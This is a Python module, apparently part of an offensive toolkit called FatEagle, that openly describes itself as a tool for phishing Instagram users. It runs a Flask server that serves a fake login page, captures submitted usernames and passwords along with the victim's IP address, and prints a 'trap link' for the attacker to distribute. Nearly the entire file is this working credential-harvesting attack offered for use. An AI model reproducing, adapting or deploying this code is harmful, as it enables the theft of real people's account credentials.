from re import S
from flask.scaffold import F
from werkzeug.utils import redirect
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import json
import signal
import socket
import shutil

class InstaFox:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("InstaFox","a FeScript to phishing attack to instagram pages.","""a FeScript to deploy a phishing attack to instagram users. support port forward and local attacks.""",{'host': {'Body': '0.0.0.0', 'Description': 'ip address or url of host that receives data.', 'Require': True}, 'port': {'Body': '80', 'Description': 'port of host that is listening to receive data.', 'Require': True}},"0xDeviI")

    def __init__(self):
      pass
    
    def help(self):
      print(self._fs._totalDesc)
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      res = input("is host a port or ip forward service ? (Y/N)")
      ipopfu = False
      if (res == "Y"):
        ipopfu = True

      try:
        while (True):
          from flask import Flask, request, render_template
          import logging
          app = Flask(__name__)
          # log = logging.getLogger('werkzeug')
          # log.disabled = True

          @app.route('/')
          def home():
            _user = request.args.get("username")
            _pass = request.args.get("password")
            if (_user != None and _pass != None):
              print(Fore.LIGHTGREEN_EX + "[+] New login captured:" + Fore.RESET)
              print(Fore.LIGHTGREEN_EX + "        username: " + Fore.RESET + _user)
              print(Fore.LIGHTGREEN_EX + "        password: " + Fore.RESET + _pass)
              print(Fore.LIGHTGREEN_EX + "        IP: " + Fore.RESET + request.remote_addr + Fore.RESET)
              return json.dumps({'success':True}), 200, {'ContentType':'application/json'} 
            else:
              return render_template('index.html')
          
          ip = socket.gethostbyname(socket.gethostname())
          shutil.copyfile("fescripts/Web/Attack/Phishing/templates/_index.html","fescripts/Web/Attack/Phishing/templates/index.html",follow_symlinks=True)
          _FILE = open("fescripts/Web/Attack/Phishing/templates/index.html","r",encoding="utf-8")
          cont = _FILE.read()
          _FILE.close()
          if (ipopfu):
            cont = cont.replace("__SERVER_LINK__","http://" + self._fs._Opt["host"]["Body"] + "/")
          else:
            if (self._fs._Opt["host"]["Body"] == "0.0.0.0"):
              cont = cont.replace("__SERVER_LINK__","http://" + ip + ":" + self._fs._Opt["port"]["Body"] + "/")
            else:
              cont = cont.replace("__SERVER_LINK__","http://" + self._fs._Opt["host"]["Body"] + ":" + self._fs._Opt["port"]["Body"] + "/")
          _FILE = open("fescripts/Web/Attack/Phishing/templates/index.html","w",encoding="utf-8")
          _FILE.write(cont)
          _FILE.close()
          if (ipopfu):
            print(Fore.YELLOW + "Your Trap Link: http://" + self._fs._Opt["host"]["Body"] + Fore.RESET)
            app.run(host="127.0.0.1",port=int(self._fs._Opt["port"]["Body"]))
          else:
            if (self._fs._Opt["host"]["Body"] == "0.0.0.0"):
              print(Fore.YELLOW + "Your Trap Link: http://" + ip + ":" + self._fs._Opt["port"]["Body"] + Fore.RESET)
              app.run(host=ip,port=int(self._fs._Opt["port"]["Body"]))
            else:
              print(Fore.YELLOW + "Your Trap Link: http://" + self._fs._Opt["host"]["Body"] + Fore.RESET)
              app.run(host=self._fs._Opt["host"]["Body"],port=int(self._fs._Opt["port"]["Body"]))
      except KeyboardInterrupt:
        pass
      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("FatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      self._fs._Opt[prop]["Body"] = value
